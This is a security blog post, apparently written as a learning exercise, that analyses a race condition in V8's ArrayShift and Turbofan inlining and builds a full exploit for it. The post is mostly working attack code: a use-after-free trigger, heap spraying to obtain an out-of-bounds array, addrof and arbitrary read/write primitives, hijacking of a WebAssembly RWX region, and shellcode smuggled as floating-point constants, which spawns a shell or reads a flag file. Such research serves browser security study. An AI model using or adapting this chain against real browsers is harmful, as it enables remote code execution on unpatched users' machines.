---
title: "v8 - ArrayShift Race Condition"
date: 2024-06-09
draft: false
tags: ["browser", "v8", "arrayshift", "turbofan"]
---



In this post, we’ll explore how to exploit a `race condition` in the `V8` JavaScript engine, between the `turbofan thread` and the `main thread` that executes `ArrayShift` builtin function.
<!--more-->
TL;DR: Two different references to the same object is made from the `turbofan thread` and the `main thread`, thereby giving us UAF in the heap.

PS: This is my attempt to understand the `ArrayShift CVE` with the help of this [blogpost](https://blog.exodusintel.com/2023/05/16/google-chrome-v8-arrayshift-race-condition-remote-code-execution/). 

## Analysis

### Builtins: ArrayShift
The `ArrayShift` method removes the first element from an array and shifts the entire array to the left by one index. This process frees the elements' pointer and reallocates it, potentially leading to memory corruption if not handled properly.

### Creating Constant  
> ReduceElementLoadFromHeapConstant() - `inlining phase`
When a value is frequently accessed, V8 optimizes it by treating it as a constant until the underlying array (Copy-On-Write or COW) changes. This optimization creates a reference to the element that can become problematic during concurrent operations.

## The Bug
The core issue arises when the Turbofan thread executes `ReduceElementLoadFromHeapConstant`, creating a reference to an array's element. Meanwhile, the main thread executes the `ArrayShift` prototype, which causes the reference to point, to a freed memory region in the heap.

### Race Condition
```c
// src/compiler/js-heap-broker.cc
return FixedArrayBaseRef(
        broker(), broker()->CanonicalPersistentHandle(object()->elements()));
```
This line retrieves a pointer to the elements of the fixed array. Note that handles are tracked by V8's garbage collector (GC).

After executing the `ArrayShift`, a filler object replaces the first element:
```c
// src/heap/heap.cc
CreateFillerObjectAt(old_start, bytes_to_trim,
                    MayContainRecordedSlots(object)
                        ? ClearRecordedSlots::kYes
                        : ClearRecordedSlots::kNo);
``` 

### Memory State Example
Here’s a glimpse of the memory layout after each shift operation:

```
elements: 0x12fa08295ee1 <FixedArray[145]>
elements: 0x12fa08295ee5 <FixedArray[144]> 
elements: 0x12fa08295ee9 <FixedArray[143]>
```

## Proof of Concept (PoC)
This is the POC given by `exodus intelligence`, in their blog (mentioned below). In the below code the variable `a` has reference to the `filter` created by the arrayshift. Meanwhile in Garbage Collection cycle, `filters` are more or less treated as free space. Hence you have reference (Dangling pointer) to freed space. 

```javascript
function exploit() {
    let bugSize = 120;
    let pushObj = [6969];
    let barr = [1.1];

    for (let i = 0; i < bugSize; i++) {
        barr.push(pushObj);
    }

    function danglingRef() {
        barr.shift();                                       // Shift the array
        for (let v19 = 0; v19 < 10000; v19++) {}            // Busy wait
        let a = barr[0];                                    // Reference to freed element

        gc();                                               // Trigger garbage collection
        for (let v19 = 0; v19 < 500; v19++) {}              // More busy wait
    }

    for (let i = 0; i < 4; i++) {
        danglingRef();
    }
}

exploit();
```

- `barr` is the array we will perform the bug on, in which `6969` is the marker which can be used in later stages while heap sprays are performed.
- We do a `barr.shift()` to trigger the `shift` prototype and in parallel the `inlining phase` is being run, which is supposed to make the barr[0] a constant reference. why optimize? In javascript the type is dynamic, So to skip the map verification steps, directly placing a reference to the first element will make things faster.
- I'm still unsure how they arrived at the number `4`. When I asked one of the exploiters who developed this, they mentioned it was determined through dynamic testing and multiple runs. I don't have a clear explanation for it just yet.

## Main Exploit Logic
We can try to understand my exploit part-by-part. Initially, we have all the standard exploitation utilities to trigger the GC cycle, convert float to int and vice-versa.

```javascript
///////////////////////////////////////////////////////////////////////
///////////////////         Utility Functions       ///////////////////
///////////////////////////////////////////////////////////////////////

let hex = (val) => '0x' + val.toString(16);

function gc() {
    for (let i = 0; i < 0x10; i++) new ArrayBuffer(0x1000000);
}

function print(msg) {
    // %DebugPrint(msg);
    console.log("[+] " + msg);
}

function js_heap_defragment() { // used for stable fake JSValue crafting
    gc();
    for (let i = 0; i < 0x1000; i++) new ArrayBuffer(0x10);
    for (let i = 0; i < 0x1000; i++) new Uint32Array(1);
}

// 8 byte array buffer
const __buf = new ArrayBuffer(8);
const __f64_buf = new Float64Array(__buf);
const __u32_buf = new Uint32Array(__buf);

// typeof(val) = float
function ftoi(val) {
    __f64_buf[0] = val;
    return BigInt(__u32_buf[0]) + (BigInt(__u32_buf[1]) << 32n); // Watch for little endianness
}

// typeof(val) = BigInt
function itof(val) {
    __u32_buf[0] = Number(val & 0xffffffffn);
    __u32_buf[1] = Number(val >> 32n);
    return __f64_buf[0];
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function reverse(x) {
    var buf = new ArrayBuffer(0x20);
    var view1 = new BigInt64Array(buf);
    var view2 = new Uint8Array(buf);
    view1[0] = x;
    view2.reverse();
    return view1[3];
}

function assert(x) {
    console.assert(x);
}
```

Now I created a wasm instance that has our smuggled shellcode, Which I have explained below. This is used in the later stages of exploit to get Code Execution.
```js
////////////////////////////////////////////////////////////////////////
/////////////////////         Main Exploit         /////////////////////
////////////////////////////////////////////////////////////////////////

var wasm_code = new Uint8Array([0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x05,0x01,0x60,0x00,0x01,0x7c,0x03,0x02,0x01,0x00,0x07,0x08,0x01,0x04,0x6d,0x61,0x69,0x6e,0x00,0x00,0x0a,0x53,0x01,0x51,0x00,0x44,0xbb,0x2f,0x73,0x68,0x00,0x90,0xeb,0x07,0x44,0x48,0xc1,0xe3,0x20,0x90,0x90,0xeb,0x07,0x44,0xba,0x2f,0x62,0x69,0x6e,0x90,0xeb,0x07,0x44,0x48,0x01,0xd3,0x53,0x31,0xc0,0xeb,0x07,0x44,0xb0,0x3b,0x48,0x89,0xe7,0x90,0xeb,0x07,0x44,0x31,0xd2,0x48,0x31,0xf6,0x90,0xeb,0x07,0x44,0x0f,0x05,0x90,0x90,0x90,0x90,0xeb,0x07,0x44,0x0f,0x05,0x90,0x90,0x90,0x90,0xeb,0x07,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x0b]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f1 = wasm_instance.exports.main;
```

Below exploit code is similar to the POC, which tries to get a dangling pointer in `val`. 
```js
function exploit() {

    let push_obj = [420];
    let arr = [1.1]; 

    for(let i=0;i<120;i++){
        arr.push(push_obj);
    }
    
    function bug(){
        arr.shift()                                             // move the array.    
        
        for (let i = 0; i < 10000; i++) { console.i += 1; }     // Trigger the compilation job
        
        let val = arr[0];                                       // reduce heap constant         
        function gcing() {
            const v15 = new Uint8ClampedArray(120*0x400000);
        }
        
        gcing();                                                // Use After Free trigger - relocate the elements to old space
        for (let v19 = 0; v19 < 500; v19++) {}                  // not sure why ? (time issue ?)
    }
    
    // 4th time is when the race condition happens.
    for(let i=0;i<4;i++){
        bug();
    }
```

Next, we start spraying the heap with multiple arrays to get to know where the dangling pointer is at. We know we have an overlap with the dangling pointer with the help of `if(arr[0] != push_obj)` check. We can further confirm that it is our arrays with size `0x50` and `0x60` consecutively. Then we search through all the arrays that has a new_len and we can confirm that it will be our Out Of bounds array. Since the actual length is much smaller than the manipulated length.

```js
    // Spraying the arr elements pointer to get OOB array.
    let size_search = 0x50;
    let n_size_search = 0x60;
    let arr_search = [];
    let tmparr = new Array(Math.floor(size_search)).fill(9.9);
    let placeholder_obj = [];
    let tmpMarkerArray =  new Array(n_size_search).fill({
      a: placeholder_obj, b: placeholder_obj, notamarker: 0x12341234, floatprop: 9.9
    });
    let tmpfarr= [...tmparr];
    let new_len = 0xffffff;

    for (let i = 0; i < 10000; i++) {
        arr_search.push([...tmpMarkerArray]);
        arr_search.push([...tmpfarr]);
    }
    if(arr[0] != push_obj){
        for(let i=0;i<0x100;i++){
            if(arr[i] == size_search && arr[i+12] == n_size_search){
                arr[i] = new_len;
                break;
            }
        }

        let OOB;
        for(let i=0;i<10000;i++){
            if(arr_search[i].length == new_len){
                OOB = arr_search[i];
                print("OOB array found in the spray");
                break;
            }
        }
```

Now that we have an OOB Array, We can get something much stabler to setup our `ARB read` and `ARB write` primitives. We try to find the location of the `local_findme` object with respect to the initial `OOB` array we have. We can get the offset `i` stored in `marker` for the same.
```js
        let objarr = [];
        for(let j=0;j<10000;j++){
            let local_findme = {
                a: placeholder_obj, b: placeholder_obj, findme: 0x11111111, floatprop: 1.337, findyou:0x12341234
            };
            objarr.push(local_findme);
            function gcing(){
                const r = new String("Hello GC?");
            }
            gcing();
        }

        let marker = -1;
        let leak_obj;
        for(let i=size_search;i<new_len;i++){
            ftoi(OOB[i]);                                   // Why is this here ? No idea.

            if(hex(ftoi(OOB[i])).includes("22222222")){
                
                let aux = new ArrayBuffer(8);
                let int_aux = new Uint32Array(aux);
                let float_aux = new Float64Array(aux);
                
                float_aux[0] = OOB[i];
                if(int_aux[0].toString(16) == "22222222"){
                    int_aux[0] == 0x44444444;
                }
                else{
                    int_aux[1] = 0x44444444;
                }
                OOB[i] = float_aux[0];

                for(let j=0; j<objarr.length; j++){
                    if(objarr[j].findme != 0x11111111){
                        leak_obj = objarr[j];
                        marker = i;
                        print("Found the leakable object. ");
                        break;
                    }
                }
                if(marker != -1){
                    break;
                }
            }
        }
```

We create our standard addrof primitive. Which would put the object of which we need to leak the address. then from the `OOB`, we can get its address.
```js
        print("Achieved addrof primitive.")
        function addrof(obj){
            leak_obj.a = obj;
            leak_obj.b = obj;

            let aux = new ArrayBuffer(8);
            let int_aux = new Uint32Array(aux);
            let float_aux = new Float64Array(aux);

            float_aux[0] = OOB[marker - 1];

            if(int_aux[0] != int_aux[1]){
                int_aux[0] = int_aux[1];
            }

            let res = BigInt(int_aux[0]);
            return res;
        }
```

We have this kind of a structure where we check if the `int_aux[0] == 0x44444444` because sometimes the stack can be aligned differently because of the pointer compression. Hence in-order for us to know if its the higher/ lower 32 bits we use this special identifier.
```js
        print("Achieved Arbitrary Read.");
        function read64(addr){
            let aux = new ArrayBuffer(8);
            let int_aux = new Uint32Array(aux);
            let float_aux = new Float64Array(aux);

            float_aux[0] = OOB[marker];

            let save, ret;
            if(int_aux[0] == 0x44444444){
                save = float_aux[0];
                int_aux[1] = Number(addr-4n);
                OOB[marker] = float_aux[0];
            }
            else{
                float_aux[0] = OOB[marker+1];
                save = float_aux[0];
                int_aux[0] = Number(addr-4n);
                OOB[marker+1] = float_aux[0];
            }
            ret = leak_obj.floatprop;
            OOB[(int_aux[0] == 0x44444444) ? marker : marker+1] = save;
            return ftoi(ret);
        }
```

Similarly, We can use the same `OOB` array to do an 64 bit arbitrary `write` with the help of the fields in our special object we created before (`local_findme`).

```js
        print("Achieved arbitrary write.")
        function write64(addr, val){
            let aux = new ArrayBuffer(8);
            let int_aux = new Uint32Array(aux);
            let float_aux = new Float64Array(aux);
            
            float_aux[0] = OOB[marker];
            
            let save;
            if(int_aux[0] == 0x44444444){
                save = float_aux[0];
                int_aux[1] = Number(addr-4n);
                OOB[marker] = float_aux[0];
            }
            else{
                float_aux[0] = OOB[marker+1];
                save = float_aux[0];
                int_aux[0] = Number(addr-4n);
                OOB[marker+1] = float_aux[0];
            }
            leak_obj.floatprop = itof(val);
            OOB[(int_aux[0] == 0x44444444) ? marker : marker+1] = save;
            if(read64(addr) != val){
                print("write failed.");
                return 1;
            }
        }

```

We find the address of the `wasm_instance`, from which a specific offset contains `RWX` region address, where we have our smuggled shellcode. So we overwrite the `main`'s entry point to our smuggled shellcode. 
```js
        let addr_wasm = addrof(wasm_instance);
        let addr_rwx = read64(addr_wasm + 0x68n);
        print("RWX: " + hex(addr_rwx));
        
        // 64 bit address and 64 bit write.
        let bof = new ArrayBuffer(8);
        let int_bof = new Uint32Array(bof);
        let float_bof = new Float64Array(bof);
        let addr_int_bof = addrof(int_bof);

        write64(addr_int_bof+0x28n, addr_rwx);
        int_bof[0] = 0x047be9;
        print(hex(read64(addr_int_bof+0x28n)));
        // print(hex(read64(addr_rwx-411n)));
        int_bof;
        f1();
    }
    else{
        print("Double reference failed. Race condition not achieved. ")
    }
}

exploit();
```

## How to Smuggle shellcode?

For example, Lets say we have the following `WAT` file which we used as our wasm instance, the floating values in the IEEE format convert to a 8 byte value. In memory, they are something like `mov reg, value, more ins`, So we can abuse this to put 6 byte shellcode along with the relative jump to the next instruction. 
```wasm
(module
  (func (export "main") (result f64)
    f64.const 1.630394162327604e-270
    f64.const 1.630523884017562e-270
    f64.const 1.6304934513099134e-270
    f64.const 1.6415294311136155e-270
    f64.const 1.6306027780368592e-270
    f64.const 1.6306160067349917e-270
    f64.const 1.6305242777505848e-270
    f64.const 1.6305242777505848e-270
    drop
    drop
    drop
    drop
    drop
    drop
    drop
))
```

So I have a Sample program to do the same.
```py
from pwn import *
from ctypes import *

instructions = [
"mov ebx, 0x0068732f",
"shl rbx, 32",
"mov edx, 0x6e69622f",
"add rbx, rdx",
"push rbx",
"xor eax, eax",
"mov al, 0x3b",
"mov rdi, rsp",
"xor edx, edx",
"xor rsi, rsi",
"syscall",
"nop",
"nop"
]
context.arch = "amd64"
tmp = b""
for ins in instructions:
    if(len(asm(ins) + tmp) > 6):
        print(hex(u64((tmp.ljust(6, b"\x90") + asm("jmp $+9")))))
        tmp = asm(ins)
    else:
        tmp += asm(ins) 
print(hex(u64((tmp.ljust(6, b"\x90") + asm("jmp $+9")))))

'''
0x7eb900068732fbb 1.630394162327604e-270
0x7eb909020e3c148 1.630523884017562e-270
0x7eb906e69622fba 1.6304934513099134e-270
0x7ebc03153d30148 1.6415294311136155e-270
0x7eb90e789483bb0 1.6306027780368592e-270
0x7eb90f63148d231 1.6306160067349917e-270
0x7eb90909090050f 1.6305242777505848e-270
'''
```

If you spend more time on this, you can make a better shellcode generator. For example, for a [hypervisor](https://github.com/tourpran/pwn-hub/tree/main/ctf/nite) challenge, I smuggled this particular type shellcode into the JIT-ted area. 
```py
from pwn import *

context.arch = "amd64"

sh = """mov eax, 2
    pushw 0x0067
    pushw 0x616c
    pushw 0x662f
    xchg rdi, rsp
    xor esi, esi
    xor edx, edx
    syscall
    mov esi, eax
    mov edi, 1
    mov al, 40
    mov eax, 0x100
    mov r10, eax
    syscall
    """.split("\n")

cnt = 0
reg = ["rdi", "rsi", "rdx", "r15", "r14", "r13", "r12", "r11", "r10", "r9", "r8","rdi"]
tmp = b""
final = ""
for ins in sh:
    print(ins)
    if(len(tmp + asm(ins)) >= 6):
        final += f"\"mov {reg[cnt]}, 0x{asm("jmp $+8")[::-1].hex() + "90"*(6-len(tmp)) + tmp[::-1].hex()};\"\n"
        tmp = asm(ins)
        cnt += 1
    else:
        tmp += asm(ins)

final +=  f"\"mov {reg[cnt]}, 0x{asm("jmp $+8")[::-1].hex() + "90"*(6-len(tmp)) + tmp[::-1].hex()};\"\n"

print(final)
```

If you want the files to try it our on your own: [repo containing files](https://github.com/tourpran/pwn-hub/tree/main/v8-exp/cve-2024-0517)

### Roadblocks

While working on this exploit, I encountered several challenges:
1. **Separation of Main and Elements Blocks**: The main object block is significantly distanced from the elements block, complicating pointer manipulation.
2. **Finding Arbitrary Read**: I initially struggled to find an effective way to achieve arbitrary read access, unaware that an inline `HeapNumber` would serve as a pointer to an IEEE format.
3. **Typed Arrays**: Despite being challenging, I realized that typed arrays retain their backing store, allowing for straightforward 64-bit writes.
4. **Skill Development**: This project was a steep learning curve, highlighting the complexities involved in exploitation.

## References
- [Exodus Intelligence Blog on V8 ArrayShift Race Condition](https://blog.exodusintel.com/2023/05/16/google-chrome-v8-arrayshift-race-condition-remote-code-execution/)
